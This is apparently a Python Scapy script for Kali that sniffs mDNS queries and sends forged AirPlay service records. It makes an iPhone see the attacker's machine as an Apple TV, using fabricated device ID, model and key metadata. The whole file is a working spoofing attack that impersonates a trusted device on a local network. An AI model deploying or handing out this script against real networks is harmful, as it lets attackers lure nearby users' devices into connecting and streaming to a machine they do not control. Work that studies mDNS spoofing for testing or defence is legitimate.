# active_response_airplay.py - respond to mDNS queries from iPhone like a real Apple TV

from scapy.all import *

iface = "wlan1"
ip_address = "172.16.16.251"  # kali's IP
hostname = "faketv.local"
service_name = "_airplay._tcp.local"
instance_name = "Apple-TV-Living._airplay._tcp.local"

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# build TXT block with realistic metadata
def build_txt(txts):
    return b"".join([bytes([len(t)]) + t for t in txts])

apple_txt = build_txt([
    b"deviceid=12:34:56:78:90:ab",
    b"features=0x5A7FFFF7",
    b"model=AppleTV5,3",
    b"srcvers=220.68",
    b"protovers=1.1",
    b"vv=2",
    b"flags=0x4",
    b"pi=E2D5E415-EDB4-4F67-BE08-A3125D4986B6",
    b"pk=711AF3C3043C5C2F8A60BBFB5BE3C5ABBDCB7B8E173B3609939EDE57AA9375C2"
])

# build answer packet
def build_response(dst_mac):
    ptr = DNSRR(rrname=service_name, type="PTR", ttl=4500, rdata=instance_name)
    srv = DNSRR(rrname=instance_name, type="SRV", ttl=120, rdata="0 0 7000 %s" % hostname)
    txt = DNSRR(rrname=instance_name, type="TXT", ttl=4500, rdata=apple_txt)
    arec = DNSRR(rrname=hostname, type="A", ttl=120, rdata=ip_address)

    pkt = (
        Ether(dst=dst_mac) /
        IP(dst="224.0.0.251") /
        UDP(sport=5353, dport=5353) /
        DNS(
            id=0,
            qr=1,
            aa=1,
            qdcount=0,
            ancount=4,
            an=[ptr, srv, txt, arec]
        )
    )
    return pkt

# listen and respond
def handle(pkt):
    if pkt.haslayer(DNSQR) and service_name.encode() in pkt[DNSQR].qname:
        src_mac = pkt[Ether].src
        print(f"[>] received query from {pkt[IP].src} â†’ responding as AirPlay")
        response = build_response(src_mac)
        sendp(response, iface=iface, verbose=0)

print(Colors.GREEN + "[*] listening for mDNS queries from iPhone and responding like Apple TV..." + Colors.ENDC)
sniff(iface=iface, filter="udp port 5353", prn=handle, store=0)
